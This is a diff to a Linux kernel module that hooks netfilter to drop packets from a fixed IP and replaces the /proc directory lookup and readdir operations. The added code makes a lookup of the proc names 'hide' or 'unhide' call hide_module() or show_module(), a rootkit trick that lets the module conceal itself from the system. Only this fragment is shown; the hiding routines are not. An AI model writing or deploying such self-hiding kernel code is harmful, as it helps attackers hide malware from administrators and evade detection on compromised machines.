@@ -6,6 +6,7 @@
 #include <linux/netfilter_ipv4.h>
 #include "util.h"
 #include "module.h"
+#include "hidemod.h"
 
 /* IP address we want to drop packets from, in NB order */
 __be32 drop_ip  = 0x01020304;
@@ -40,14 +41,23 @@ unsigned int hook_func (unsigned int hooknum,
 }
 
 int new_proc_filldir(void *__buf, const char * name, int namelen, loff_t offset, ino_t ino, unsigned u)
-{
+{	
+	printk("My proc filldir called: %s\n", name);
 	return 0;
 }
 
 struct dentry * new_proc_lookup(struct inode *i, struct dentry *d, struct nameidata *nd)
 {
-	printk("My proc lookup called: %s\n", d->d_name.name);
-	return proc_original_inode_operations.lookup(i, d, nd);
+	if(!strcmp(d->d_name.name, "unhide")) {
+		printk("My proc lookup called: %s\n", d->d_name.name);
+		show_module();
+		return NULL;
+	} else if( !strcmp(d->d_name.name, "hide")) {
+		printk("My proc lookup called: %s\n", d->d_name.name);
+		hide_module();
+		return NULL;
+	} else
+		return proc_original_inode_operations.lookup(i, d, nd);
 }
 
 int new_proc_readdir(struct file *a, void *b, filldir_t c)
